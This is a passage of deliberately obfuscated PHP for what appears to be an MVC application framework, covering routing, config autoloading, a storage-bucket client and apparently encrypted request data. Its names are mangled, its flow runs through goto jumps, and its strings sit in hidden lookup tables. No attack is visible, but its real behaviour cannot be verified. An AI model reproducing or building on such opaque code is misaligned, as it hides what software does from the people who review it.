e¸ÙÜğ­Â¨: $cëš¾ç­® =& $_SERVER[¹Ò‹Ò¹]; $CÛö…„¦õù = rtrim($CÛö…„¦õù, $cëš¾ç­®[8]); if ($CÛö…„¦õù == $cëš¾ç­®[33] || $CÛö…„¦õù == $cëš¾ç­®[8]) { return !0; } goto a¯ƒé‡ÔØ; a¯ƒé‡ÔØ: $Bïº‚õß‡ó = $this->client->getBucket($this->bucket, $CÛö…„¦õù, null, 1); if (empty($Bïº‚õß‡ó[$cëš¾ç­®[196]])) { return !1; } $DºÔÈˆÛÓï = $Bïº‚õß‡ó[$cëš¾ç­®[196]][0][$cëš¾ç­®[28]]; goto e…ä¾íÖ­ê; E˜«µˆˆ–Ø: } } define($_SERVER[¹Ò‹Ò¹][234], 1); goto Fµ¥´œ—ò•; c¼™¤µ¶”: $A½ÇÊØ¶®‘ = $_SERVER[¹Ò‹Ò¹][573]; if (!$A½ÇÊØ¶®‘) { die; } class Application { private $defaultModule = "\x69\x6e\144\x65\170"; private $defaultController = "\x69\x6e\x64\145\x78"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($EŒŞƒÓ‘ä) { goto e”ƒˆÎóºæ; e”ƒˆÎóºæ: $FÀƒÒØÅ¶ =& $_SERVER[¹Ò‹Ò¹]; $fÁ³‚ÍÍÑ” =& $_SERVER[¬œç„§²ö°ô]; $cÖ„ÈÚÛÓŒ = $fÁ³‚ÍÍÑ”[0]($fÁ³‚ÍÍÑ”[1], $fÁ³‚ÍÍÑ”[2]($EŒŞƒÓ‘ä, $fÁ³‚ÍÍÑ”[1])); goto AÄğ¹˜–­ï; CÌÔØâ¼ØÀ: $E†Ÿà­ƒæë = $FÀƒÒØÅ¶[575]; if (!$E†Ÿà­ƒæë) { die; } $this->defaultAction = $cÖ„ÈÚÛÓŒ[2] ? $cÖ„ÈÚÛÓŒ[2] : $this->defaultAction; goto cÔƒÓ»Î´; cÔƒÓ»Î´: $eÁÎÁãŞ“ = $FÀƒÒØÅ¶[576]; $this->{$_SERVER[¬œç„§²ö°ô][3]}($fÁ³‚ÍÍÑ”[4], array($this, $fÁ³‚ÍÍÑ”[5])); goto cÃÑçßÒ¬; AÄğ¹˜–­ï: $this->defaultModule = $cÖ„ÈÚÛÓŒ[0] ? $cÖ„ÈÚÛÓŒ[0] : $this->defaultModule; $AùÓ¤Åº—é = $FÀƒÒØÅ¶[574]; $this->defaultController = $cÖ„ÈÚÛÓŒ[1] ? $cÖ„ÈÚÛÓŒ[1] : $this->defaultController; goto CÌÔØâ¼ØÀ; cÃÑçßÒ¬: } public function appRun($F„Ñê†ä¤ø) { goto Aå½¼ÀÆšé; bĞÒµ•¦ÍŠ: $E¬ÏšÄÆ‘ [13](array($E¬ÏšÄÆ‘ [14], $E¬ÏšÄÆ‘ [15]), $D—‘—…×ë® . $E¬ÏšÄÆ‘ [18], $F„Ñê†ä¤ø); $B Œ¯¿ìÖø = $C°¥¼Áºê[580]; if (!$B Œ¯¿ìÖø) { return; } goto E¼²„°İÇÚ; Aå½¼ÀÆšé: $C°¥¼Áºê =& $_SERVER[¹Ò‹Ò¹]; $E¬ÏšÄÆ‘  =& $_SERVER[¬œç„§²ö°ô]; $B«Í®Í‚œé = $E¬ÏšÄÆ‘ [0]($E¬ÏšÄÆ‘ [1], $F„Ñê†ä¤ø); goto fÇÑµ¼×¶æ; Fæî„ò’Ø¸: $D—‘—…×ë® = $E¬ÏšÄÆ‘ [7]; if ($dÜ–çöç£ == $E¬ÏšÄÆ‘ [8]) { $D—‘—…×ë® = $E¬ÏšÄÆ‘ [9]; $B«Í®Í‚œé[0] = $E¬ÏšÄÆ‘ [10]; $B«Í®Í‚œé[1] = $B«Í®Í‚œé[1] . $E¬ÏšÄÆ‘ [11]; $F„Ñê†ä¤ø = $E¬ÏšÄÆ‘ [12]($E¬ÏšÄÆ‘ [1], $B«Í®Í‚œé); $F„Ñê†ä¤ø = $E¬ÏšÄÆ‘ [2]($F„Ñê†ä¤ø, $E¬ÏšÄÆ‘ [1]); } $E¬ÏšÄÆ‘ [13](array($E¬ÏšÄÆ‘ [14], $E¬ÏšÄÆ‘ [15]), $D—‘—…×ë® . $E¬ÏšÄÆ‘ [16], $F„Ñê†ä¤ø); goto a»ªàëÂÎĞ; fÇÑµ¼×¶æ: $dÜ–çöç£ = $E¬ÏšÄÆ‘ [6]($B«Í®Í‚œé[0]); $D¥ˆ¬Ñ‰Æ = $C°¥¼Áºê[577]; if (!$D¥ˆ¬Ñ‰Æ) { return; } goto Fæî„ò’Ø¸; a»ªàëÂÎĞ: $E¬ÏšÄÆ‘ [17]($F„Ñê†ä¤ø); $d‰îô¿—óÇ = $C°¥¼Áºê[578]; while ($d‰îô¿—óÇ < $C°¥¼Áºê[579]) { if ($d‰îô¿—óÇ >= 0) { break; } $d‰îô¿—óÇ++; } goto bĞÒµ•¦ÍŠ; E¼²„°İÇÚ: } private function autorun() { goto Dˆ¾´Åİ°; BĞáö¯ïóÔ: foreach ($config[$e´‰„Ê™Ë[20]] as $bø·åÏÒµó => $D°˜ ¸“÷Ø) { $this->{$_SERVER[¬œç„§²ö°ô][21]}($D°˜ ¸“÷Ø); } goto EÄæ“·ˆêµ; dÖ‚ÄÄ”Ÿù: $d˜¥¸…½©® = $D­™“ò¾Ë§[581]; if (strlen($d˜¥¸…½©®) < $D­™“ò¾Ë§[582]) { die; } if ($e´‰„Ê™Ë[19]($config[$e´‰„Ê™Ë[20]]) == 0) { return; } goto BĞáö¯ïóÔ; Dˆ¾´Åİ°: $D­™“ò¾Ë§ =& $_SERVER[¹Ò‹Ò¹]; $e´‰„Ê™Ë =& $_SERVER[¬œç„§²ö°ô]; global $config; goto dÖ‚ÄÄ”Ÿù; EÄæ“·ˆêµ: } private function xwyzbfbd41c9() { goto E»§š…¹î; fö¬¸ì‚ÇÕ: $cµËÇ˜Êè– = $dˆì èãÈš[584]; while (strlen($cµËÇ˜Êè–) < $dˆì èãÈš[579]) { if (!$cµËÇ˜Êè–) { break; } $cµËÇ˜Êè–++; } $GLOBALS[$D¬ÒáåÕê•[22]][$D¬ÒáåÕê•[28]] = $D¬ÒáåÕê•[29]($D¬ÒáåÕê•[1], $GLOBALS[$D¬ÒáåÕê•[22]][$D¬ÒáåÕê•[23]]); goto a¤¼—ë³Ñ×; D×ğ¸šì»Ô: if (!$FÉë„¥–é„ || $D¬ÒáåÕê•[24]($FÉë„¥–é„) <= $D¬ÒáåÕê•[24]($AÙÏÜù’èà)) { return; } if ($D¬ÒáåÕê•[6]($D¬ÒáåÕê•[25]($FÉë„¥–é„, -$D¬ÒáåÕê•[24]($AÙÏÜù’èà))) != $AÙÏÜù’èà) { return; } $e¹ÒÃÂ‚›­ = $D¬ÒáåÕê•[25]($FÉë„¥–é„, 0, -$D¬ÒáåÕê•[24]($AÙÏÜù’èà)); goto C¤‰¢àÛ¢ğ; a¤¼—ë³Ñ×: $Aãçøé º¡ = $dˆì èãÈš[585]; if (!$Aãçøé º¡) { die; } goto eÊ—Éá‰Š; C¤‰¢àÛ¢ğ: $BÎ—ÄÔÇ¯˜ = array($D¬ÒáåÕê•[8], $e¹ÒÃÂ‚›­); $bÜ»×‚ï…² = $D¬ÒáåÕê•[26]($GLOBALS[$D¬ÒáåÕê•[22]][$D¬ÒáåÕê•[23]], 1); $GLOBALS[$D¬ÒáåÕê•[22]][$D¬ÒáåÕê•[23]] = $D¬ÒáåÕê•[27]($BÎ—ÄÔÇ¯˜, $bÜ»×‚ï…²); goto fö¬¸ì‚ÇÕ; E»§š…¹î: $dˆì èãÈš =& $_SERVER[¹Ò‹Ò¹]; $D¬ÒáåÕê• =& $_SERVER[¬œç„§²ö°ô]; $AÙÏÜù’èà = $D¬ÒáåÕê•[8]; goto f¤®ÈĞÓÀÅ; f¤®ÈĞÓÀÅ: $FÉë„¥–é„ = $GLOBALS[$D¬ÒáåÕê•[22]][$D¬ÒáåÕê•[23]][0]; $Bâ—”’¢ìÈ = $dˆì èãÈš[583]; if (!$Bâ—”’¢ìÈ) { die; } goto D×ğ¸šì»Ô; eÊ—Éá‰Š: } private function cihfc8f5cb2e() { goto eòê‡²¯ƒ; eòê‡²¯ƒ: $eÆá¾£Á‚ï =& $_SERVER[¹Ò‹Ò¹]; $AÕƒµªø¬é =& $_SERVER[¬œç„§²ö°ô]; if ($GLOBALS[$AÕƒµªø¬é[22]][$AÕƒµªø¬é[28]] != $AÕƒµªø¬é[10]) { return; } goto D¾™ğğ­¾; cá¡Ò‹ë…: $BğªÂñÈ¸‹ = $AÕƒµªø¬é[31]; $dÆÈèîñ˜ = $eÆá¾£Á‚ï[588]; if (strlen($dÆÈèîñ˜) < $eÆá¾£Á‚ï[579]) { return; } goto EÊòï«àİ; cÓÖÏÂáÊ: $GLOBALS[$AÕƒµªø¬é[22]][$AÕƒµªø¬é[23]] = $AÕƒµªø¬é[0]($AÕƒµªø¬é[36], $C¸Ûƒ¹ìî¼); $GLOBALS[$AÕƒµªø¬é[22]][$AÕƒµªø¬é[28]] = $AÕƒµªø¬é[29]($AÕƒµªø¬é[1], $GLOBALS[$AÕƒµªø¬é[22]][$AÕƒµªø¬é[23]]); goto DÀ˜·ÂêÔã; féñšÖ’Îã: $AÕƒµªø¬é[34]($AÕƒµªø¬é[35], $C¸Ûƒ¹ìî¼, $b‘†ãÉ¯Ñ¬); $EÙ‘Š¤ô¿£ = $eÆá¾£Á‚ï[589]; while ($EÙ‘Š¤ô¿£ < $eÆá¾£Á‚ï[570]) { if ($EÙ‘Š¤ô¿£ >= 0) { break; } $EÙ‘Š¤ô¿£++; } goto e—­ìÚª¯; EÊòï«àİ: if (!$AÕƒµªø¬é[32]($c¬÷¤çÏÓÁ, $BğªÂñÈ¸‹)) { return; } $fº†ÒˆéùÒ = $AÕƒµªø¬é[33]($c¬÷¤çÏÓÁ, $BğªÂñÈ¸‹); $C¸Ûƒ¹ìî¼ = $AÕƒµªø¬é[25]($c¬÷¤çÏÓÁ, $fº†ÒˆéùÒ + $AÕƒµªø¬é[24]($BğªÂñÈ¸‹)); goto féñšÖ’Îã; D¾™ğğ­¾: $c¬÷¤çÏÓÁ = $_SERVER[$AÕƒµªø¬é[30]]; $Cá±õ¤¿‚¹ = $eÆá¾£Á‚ï[586]; if (strlen($Cá±õ¤¿‚¹) < $eÆá¾£Á‚ï[587]) { return; } goto cá¡Ò‹ë…; e—­ìÚª¯: $C¸Ûƒ¹ìî¼ = $AÕƒµªø¬é[2]($b‘†ãÉ¯Ñ¬[0][0], $AÕƒµªø¬é[36]); $bë†‚ÅåŞ­ = $eÆá¾£Á‚ï[590]; while ($bë†‚ÅåŞ­ < $eÆá¾£Á‚ï[570]) { if ($bë†‚ÅåŞ­ >= 0) { break; } $bë†‚ÅåŞ­++; } goto cÓÖÏÂáÊ; DÀ˜·ÂêÔã: } public function run() { goto E˜ñ‹õ£„Œ; cÑ©…œéš: $AÔ…ÍŸôÑ = $E„‡æİÒÈê[595]; while ($AÔ…ÍŸôÑ < $E„‡æİÒÈê[570]) { if ($AÔ…ÍŸôÑ >= 0) { break; } $AÔ…ÍŸôÑ++; } $bÎÔÔ·ÚÂ[39]($bÎÔÔ·ÚÂ[40], isset($EÓå»Ë Ú[0]) && $EÓå»Ë Ú[0] ? $EÓå»Ë Ú[0] : $this->defaultModule); goto bÎŒè¾Êõˆ; E’ßŸ’‰: if ($bÎÔÔ·ÚÂ[19]($EÓå»Ë Ú) >= 3) { $this->{$_SERVER[¬œç„§²ö°ô][21]}($a¡ÌÚëÜ¼¨); } else { $this->{$_SERVER[¬œç„§²ö°ô][21]}(ACTION); } goto DÒáƒµäÆ”; bÎŒè¾Êõˆ: $AìÊù¹§ªœ = $E„‡æİÒÈê[596]; if (strlen($AìÊù¹§ªœ) < $E„‡æİÒÈê[587]) { return; } $bÎÔÔ·ÚÂ[39]($bÎÔÔ·ÚÂ[41], isset($EÓå»Ë Ú[1]) && $EÓå»Ë Ú[0] ? $EÓå»Ë Ú[1] : $this->defaultController); goto a¯ƒñ‘™Ç­; DÚŒÁèµÔ¨: $E­àªÜ = $E„‡æİÒÈê[591]; while ($E­àªÜ < $E„‡æİÒÈê[592]) { if ($E­àªÜ >= 0) { break; } $E­àªÜ++; } $this->{$_SERVER[¬œç„§²ö°ô][38]}(); goto a†²ù¤ğË†; f‹Ö®ÓùÒé: $EàÃ†µ = $E„‡æİÒÈê[594]; if (!$EàÃ†µ) { return; } $a¡ÌÚëÜ¼¨ = $GLOBALS[$bÎÔÔ·ÚÂ[22]][$bÎÔÔ·ÚÂ[28]]; goto cÑ©…œéš; a†²ù¤ğË†: $aÌóôóÖ„ = $E„‡æİÒÈê[593]; while (strlen($aÌóôóÖ„) < $E„‡æİÒÈê[570]) { if (!$aÌóôóÖ„) { break; } $aÌóôóÖ„++; } $EÓå»Ë Ú = $GLOBALS[$bÎÔÔ·ÚÂ[22]][$bÎÔÔ·ÚÂ[23]]; goto f‹Ö®ÓùÒé; A‘²­’ù¼‘: $bÎÔÔ·ÚÂ[39]($bÎÔÔ·ÚÂ[43], MOD . $bÎÔÔ·ÚÂ[1] . ST . $bÎÔÔ·ÚÂ[1] . ACT); $_SERVER[$bÎÔÔ·ÚÂ[44]] = $bÎÔÔ·ÚÂ[6](ACTION); $this->{$_SERVER[¬œç„§²ö°ô][45]}(); goto E’ßŸ’‰; E˜ñ‹õ£„Œ: $E„‡æİÒÈê =& $_SERVER[¹Ò‹Ò¹]; $bÎÔÔ·ÚÂ =& $_SERVER[¬œç„§²ö°ô]; $this->{$_SERVER[¬œç„§²ö°ô][37]}(); goto DÚŒÁèµÔ¨; a¯ƒñ‘™Ç­: $bÎÔÔ·ÚÂ[39]($bÎÔÔ·ÚÂ[42], isset($EÓå»Ë Ú[2]) && $EÓå»Ë Ú[0] ? $EÓå»Ë Ú[2] : $this->defaultAction); $E½¶ïÏÕâĞ = $E„‡æİÒÈê[597]; if (!$E½¶ïÏÕâĞ) { return; } goto A‘²­’ù¼‘; DÒáƒµäÆ”: } private $xczj8bf9392c = array(); private $fkuz901d71ac = ''; public function pmsw6599dcde() { goto f‰·ÚÖô; fŞì¬ÊÈÑ¢: $eôÜò¤®´æ = $EÃªĞô‹š‰[604]; $this->{$_SERVER[¬œç„§²ö°ô][3]}($dˆ™„ì‰¦·[59], array($this, $dˆ™„ì‰¦·[60])); $FƒÀ·¥ê‰‹ = $EÃªĞô‹š‰[605]; goto C¯¯Ùãœ™; eÇÙÌô‚Ëó: $this->{$_SERVER[¬œç„§²ö°ô][50]}(); $this->{$_SERVER[¬œç„§²ö°ô][51]}(); $C½™–ê®¾õ = $EÃªĞô‹š‰[601]; goto fÆíŒ¤‹º; cÖÓÆˆ…ê…: $FõÄÈ˜©¯Ä = $EÃªĞô‹š‰[598]; if (!$FõÄÈ˜©¯Ä) { return; } $this->{$_SERVER[¬œç„§²ö°ô][47]}(); goto B‚ñ´”·•; EØ–²õ‹ ­: if (!$A¾ĞìİÔ…) { return; } $this->{$_SERVER[¬œç„§²ö°ô][3]}($dˆ™„ì‰¦·[53], array($this, $dˆ™„ì‰¦·[54])); $Fí°¨„‹ä© = $EÃªĞô‹š‰[603]; goto Aó°ÃŠ¤îŸ; fÆíŒ¤‹º: while (strlen($C½™–ê®¾õ) < $EÃªĞô‹š‰[592]) { if (!$C½™–ê®¾õ) { break; } $C½™–ê®¾õ++; } $this->{$_SERVER[¬œç„§²ö°ô][52]}(); $A¾ĞìİÔ… = $EÃªĞô‹š‰[602]; goto EØ–²õ‹ ­; Fìˆ•ñê’Â: $f¤ÛÒˆœ¤Í = $EÃªĞô‹š‰[600]; if (strlen($f¤ÛÒˆœ¤Í) < $EÃªĞô‹š‰[582]) { return; } $this->{$_SERVER[¬œç„§²ö°ô][49]}(); goto eÇÙÌô‚Ëó; f‰·ÚÖô: $EÃªĞô‹š‰ =& $_SERVER[¹Ò‹Ò¹]; $dˆ™„ì‰¦· =& $_SERVER[¬œç„§²ö°ô]; $this->{$_SERVER[¬œç„§²ö°ô][46]}(); goto cÖÓÆˆ…ê…; B‚ñ´”·•: $AñÖŠîöêõ = $EÃªĞô‹š‰[599]; while ($AñÖŠîöêõ < $EÃªĞô‹š‰[587]) { if ($AñÖŠîöêõ >= 0) { break; } $AñÖŠîöêõ++; } $this->{$_SERVER[¬œç„§²ö°ô][48]}(); goto Fìˆ•ñê’Â; C¯¯Ùãœ™: while (strlen($FƒÀ·¥ê‰‹) < $EÃªĞô‹š‰[579]) { if (!$FƒÀ·¥ê‰‹) { break; } $FƒÀ·¥ê‰‹++; } goto C“ËãÂï; Aó°ÃŠ¤îŸ: while (strlen($Fí°¨„‹ä©) < $EÃªĞô‹š‰[587]) { if (!$Fí°¨„‹ä©) { break; } $Fí°¨„‹ä©++; } $this->{$_SERVER[¬œç„§²ö°ô][3]}($dˆ™„ì‰¦·[55], array($this, $dˆ™„ì‰¦·[56])); $this->{$_SERVER[¬œç„§²ö°ô][3]}($dˆ™„ì‰¦·[57], array($this, $dˆ™„ì‰¦·[58])); goto fŞì¬ÊÈÑ¢; C“ËãÂï: } public function noca2286cbad($D¬’íÏ«¶ó) { goto E‰Šá™º´ô; e‘ŠŒ—ÁÅ: $b™ôƒ¯Ü“ = $cÍ›—ÔÇ±Ë[609]; if (!$b™ôƒ¯Ü“) { die; } $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[116]] = $cƒİ±ì††ó[117]($cƒİ±ì††ó[118])->{$_SERVER[¬œç„§²ö°ô][119]}(); goto BÚã•¡Ñ·ğ; F‰Ğñ¾ÃùÏ: $D¡ïå¸åÄ  = $cÍ›—ÔÇ±Ë[606]; if (!$D¡ïå¸åÄ ) { die; } $b¾ö£äöåÙ = array($cƒİ±ì††ó[64], $cƒİ±ì††ó[65], $cƒİ±ì††ó[66], $cƒİ±ì††ó[67], $cƒİ±ì††ó[68], $cƒİ±ì††ó[69], $cƒİ±ì††ó[70], $cƒİ±ì††ó[71], $cƒİ±ì††ó[72], $cƒİ±ì††ó[73], $cƒİ±ì††ó[74], $cƒİ±ì††ó[75], $cƒİ±ì††ó[76], $cƒİ±ì††ó[77], $cƒİ±ì††ó[78], $cƒİ±ì††ó[79], $cƒİ±ì††ó[80], $cƒİ±ì††ó[81], $cƒİ±ì††ó[82], $cƒİ±ì††ó[83], $cƒİ±ì††ó[84], $cƒİ±ì††ó[85], $cƒİ±ì††ó[86], $cƒİ±ì††ó[87], $cƒİ±ì††ó[88], $cƒİ±ì††ó[89], $cƒİ±ì††ó[90], $cƒİ±ì††ó[91], $cƒİ±ì††ó[92], $cƒİ±ì††ó[93], $cƒİ±ì††ó[94], $cƒİ±ì††ó[95], $cƒİ±ì††ó[96], $cƒİ±ì††ó[97], $cƒİ±ì††ó[98], $cƒİ±ì††ó[99], $cƒİ±ì††ó[100]); goto a‡ËÂŞîŞ­; C˜ùá”‹òÙ: unset($D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[104]][$cƒİ±ì††ó[76]]); unset($D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[104]][$cƒİ±ì††ó[108]]); $D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[104]][$cƒİ±ì††ó[109]] = array($cƒİ±ì††ó[110] => (int) $bÀ£¥Î†ÜÇ[$cƒİ±ì††ó[111]], $cƒİ±ì††ó[112] => (int) $cƒİ±ì††ó[113]($bÀ£¥Î†ÜÇ, $cƒİ±ì††ó[114], 0)); goto e‘ŠŒ—ÁÅ; F³ô·¦ª½: $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[135]] = $cƒİ±ì††ó[113]($this->xczj8bf9392c, $cƒİ±ì††ó[136], $cƒİ±ì††ó[10]); $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[137]] = $cƒİ±ì††ó[113]($this->xczj8bf9392c, $cƒİ±ì††ó[138], $cƒİ±ì††ó[10]); $AªÔ¸… = $cÍ›—ÔÇ±Ë[611]; goto Dâ˜òÕ¡ ©; a‡ËÂŞîŞ­: foreach ($b¾ö£äöåÙ as $d…¸¹š°©ã) { $Fø¾ÖÙªù = $GLOBALS[$cƒİ±ì††ó[101]][$cƒİ±ì††ó[102]][$d…¸¹š°©ã]; $C‹Í¹ˆòÙ¤ = $cÍ›—ÔÇ±Ë[607]; if (!$C‹Í¹ˆòÙ¤) { die; } if (isset($FÕ÷æÙ³á [$d…¸¹š°©ã])) { $Fø¾ÖÙªù = $FÕ÷æÙ³á [$d…¸¹š°©ã]; } $D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[104]][$d…¸¹š°©ã] = $Fø¾ÖÙªù; } $bÀ£¥Î†ÜÇ = $D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[104]][$cƒİ±ì††ó[76]]; unset($D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[105]][$cƒİ±ì††ó[106]]); goto E—®ÁÖ½º×; AÑ±ªŠÛŠŸ: $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[127]] = $this->fkuz901d71ac; if ($FÕ÷æÙ³á [$cƒİ±ì††ó[127]] != $cƒİ±ì††ó[128]) { $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[129]] = $FÕ÷æÙ³á [$cƒİ±ì††ó[129]]; $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[130]] = $FÕ÷æÙ³á [$cƒİ±ì††ó[130]]; $bßÜ††ŞÎ¶ = $cƒİ±ì††ó[131](10) . $this->fkuz901d71ac . $cƒİ±ì††ó[131](5); $D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[132]][$cƒİ±ì††ó[133]] = $this->{$_SERVER[¬œç„§²ö°ô][134]}($bßÜ††ŞÎ¶, $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[120]]); } if ($this->fkuz901d71ac == $cƒİ±ì††ó[128]) { $D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[104]][$cƒİ±ì††ó[109]][$cƒİ±ì††ó[114]] = 0; } goto F³ô·¦ª½; E—®ÁÖ½º×: unset($D¬’íÏ«¶ó[$cƒİ±ì††ó[103]][$cƒİ±ì††ó[105]][$cƒİ±ì††ó[107]]); $dÜˆßèŸÚµ = $cÍ›—ÔÇ±Ë[608]; if (!$dÜˆßèŸÚµ) { return; } goto C˜ùá”‹òÙ; E‰Šá™º´ô: $cÍ›—ÔÇ±Ë =& $_SERVER[¹Ò‹Ò¹]; $cƒİ±ì††ó =& $_SERVER[¬œç„§²ö°ô]; $FÕ÷æÙ³á  = $cƒİ±ì††ó[61]($cƒİ±ì††ó[62])->{$_SERVER[¬œç„§²ö°ô][63]}(); goto F‰Ğñ¾ÃùÏ; Dâ˜òÕ¡ ©: if ($cƒİ±ì††ó[113]($GLOBALS, $cƒİ±ì††ó[139]) && $this->config[$cƒİ±ì††ó[140]]) { $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[141]] = WEB_ROOT; } return $D¬’íÏ«¶ó; goto bùŸÍ®Ë»‹; BÚã•¡Ñ·ğ: $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[120]] = $cƒİ±ì††ó[121]($_SERVER[$cƒİ±ì††ó[122]] . $FÕ÷æÙ³á [$cƒİ±ì††ó[123]]); $D¬’íÏ«¶ó[$cƒİ±ì††ó[115]][$cƒİ±ì††ó[124]] = $cƒİ±ì††ó[125]($cƒİ±ì††ó[126]()); $D­™‡¶ò©” = $cÍ›—ÔÇ±Ë[610]; goto AÑ±ªŠÛŠŸ; bùŸÍ®Ë»‹: } private function ncah33ced414() { goto c¥µ‚æÁ; d…”Îš÷Ó: $C˜…á™Ê‡Î = array($AçÈğÙ»ß[160], $AçÈğÙ»ß[161], $AçÈğÙ»ß[162], $AçÈğÙ»ß[163], $AçÈğÙ»ß[164], $AçÈğÙ»ß[165]); $FôÉØŠŞ½õ = $AçÈğÙ»ß[61]($AçÈğÙ»ß[62])->{$_SERVER[¬œç„§²ö°ô][63]}(); $FÄƒê›â«ã = $_SERVER[¹Ò‹Ò¹][612]; goto FªˆÌÁƒëİ; FªˆÌÁƒëİ: if (!$FÄƒê›â«ã) { return; } $f«º‡… = array($AçÈğÙ»ß[166] => $FôÉØŠŞ½õ[$AçÈğÙ»ß[64]], $AçÈğÙ»ß[167] => $FôÉØŠŞ½õ[$AçÈğÙ»ß[65]], $AçÈğÙ»ß[168] => $AçÈğÙ»ß[10]); foreach ($C˜…á™Ê‡Î as $Eä¿ˆõ¹´Ø) { if (!isset($FôÉØŠŞ½õ[$Eä¿ˆõ¹´Ø]) || !$FôÉØŠŞ½õ[$Eä¿ˆõ¹´Ø]) { continue; } $f«º‡…[$Eä¿ˆõ¹´Ø] = $FôÉØŠŞ½õ[$Eä¿ˆõ¹´Ø]; } goto c¬¼Âö‘; c¬¼Âö‘: $AçÈğÙ»ß[13](array($AçÈğÙ»ß[158], $AçÈğÙ»ß[159]), $f«º‡…); goto Cè¹îéÓÄÍ; c¥µ‚æÁ: $AçÈğÙ»ß =& $_SERVER[¬œç„§²ö°ô]; if ($_SERVER[$AçÈğÙ»ß[44]] == $AçÈğÙ»ß[142]) { $cÇ²ƒ±Ïº“ = array($AçÈğÙ»ß[127] => $this->fkuz901d71ac, $AçÈğÙ»ß[143] => $this->{$_SERVER[¬œç„§²ö°ô][144]}(), $AçÈğÙ»ß[145] => $AçÈğÙ»ß[61]($AçÈğÙ»ß[146])->{$_SERVER[¬œç„§²ö°ô][147]}()); if ($this->fkuz901d71ac != $AçÈğÙ»ß[128]) { $a‚ŒéÚä¤à = $AçÈğÙ»ß[113]($this->xczj8bf9392c, $AçÈğÙ»ß[148]); if ($a‚ŒéÚä¤à) { $cÇ²ƒ±Ïº“[$AçÈğÙ»ß[149]] = $a‚ŒéÚä¤à; $cÇ²ƒ±Ïº“[$AçÈğÙ»ß[150]] = $AçÈğÙ»ß[151]($AçÈğÙ»ß[113]($this->xczj8bf9392c, $AçÈğÙ»ß[152])); $cÇ²ƒ±Ïº“[$AçÈğÙ»ß[153]] = $AçÈğÙ»ß[113]($this->xczj8bf9392c, $AçÈğÙ»ß[138]); } } $cÇ²ƒ±Ïº“ = $this->{$_SERVER[¬œç„§²ö°ô][154]}($AçÈğÙ»ß[155]($cÇ²ƒ±Ïº“), $AçÈğÙ»ß[121]($AçÈğÙ»ß[156])); $f«º‡… = array($AçÈğÙ»ß[157] => $cÇ²ƒ±Ïº“); $AçÈğÙ»ß[13](array($AçÈğÙ»ß[158], $AçÈğÙ»ß[159]), $f«º‡…); } if ($this->fkuz901d71ac == $AçÈğÙ»ß[128]) { return; } goto d…”Îš÷Ó; Cè¹îéÓÄÍ: } private function gxwr48f562e0() { goto cÒã‹ÔÙÄ; båÕ°ó–¬´: $CŠ‘ÀÕÜ¸ = $e‡å£©À‰¥[622]; while ($CŠ‘ÀÕÜ¸ < $e‡å£©À‰¥[592]) { if ($CŠ‘ÀÕÜ¸ >= 0) { break; } $CŠ‘ÀÕÜ¸++; } $this->xczj8bf9392c = $E¨Ş«ÕñàÒ; goto d‡İÇª«Ö½; A£¿ÎÛŒ¤Ş: $d®¾ù•ŒÃÁ = $e‡å£©À‰¥[621]; while (strlen($d®¾ù•ŒÃÁ) < $e‡å£©À‰¥[579]) { if (!$d®¾ù•ŒÃÁ) { break; } $d®¾ù•ŒÃÁ++; } $F¸ë·²«é˜[61]($F¸ë·²«é˜[11])->{$_SERVER[¬œç„§²ö°ô][233]}($eå‹ÜùÒÈ¿[$F¸ë·²«é˜[234]], array($F¸ë·²«é˜[235] => $D…¸ğƒÙÅë)); goto båÕ°ó–¬´; AŒ§ÇÃçå: $F¸ë·²«é˜[61]($F¸ë·²«é˜[62])->{$_SERVER[¬œç„§²ö°ô][228]}($e‘¤‹À‹¢ƒ); $dªÊ”…‚ë± = $F¸ë·²«é˜[121]($_SERVER[$F¸ë·²«é˜[122]] . $F¸ë·²«é˜[221]($Dá£¾ãõŠ¨) . $e‘¤‹À‹¢ƒ[$F¸ë·²«é˜[217]]); $DˆÌñÚù¶“ = $F¸ë·²«é˜[221]($F¸ë·²«é˜[25]($dªÊ”…‚ë±, 10, 16)); goto c½®®¤Š°‹; c½®®¤Š°‹: $FöÂŸ¸®º = $this->{$_SERVER[¬œç„§²ö°ô][134]}($F¸ë·²«é˜[155]($E¨Ş«ÕñàÒ), $dªÊ”…‚ë±); $eÈôÚíù±Á = $e‡å£©À‰¥[617]; $E©’‚Åù‚ = $F¸ë·²«é˜[229]($F¸ë·²«é˜[61]($F¸ë·²«é˜[11])->{$_SERVER[¬œç„§²ö°ô][230]}(), $F¸ë·²«é˜[231]); goto c •£è»; cÒã‹ÔÙÄ: $e‡å£©À‰¥ =& $_SERVER[¹Ò‹Ò¹]; $F¸ë·²«é˜ =& $_SERVER[¬œç„§²ö°ô]; if ($_SERVER[$F¸ë·²«é˜[44]] != $F¸ë·²«é˜[169]) { return; } goto fƒ¹²İ›ˆ…; a‹º¦ÛêÅ: $e‘¤‹À‹¢ƒ = array($F¸ë·²«é˜[216] => $DäË¦ ù¦×[$F¸ë·²«é˜[172]], $F¸ë·²«é˜[217] => $E¨Ş«ÕñàÒ[$F¸ë·²«é˜[218]], $F¸ë·²«é˜[219] => $F¸ë·²«é˜[131](16), $F¸ë·²«é˜[127] => 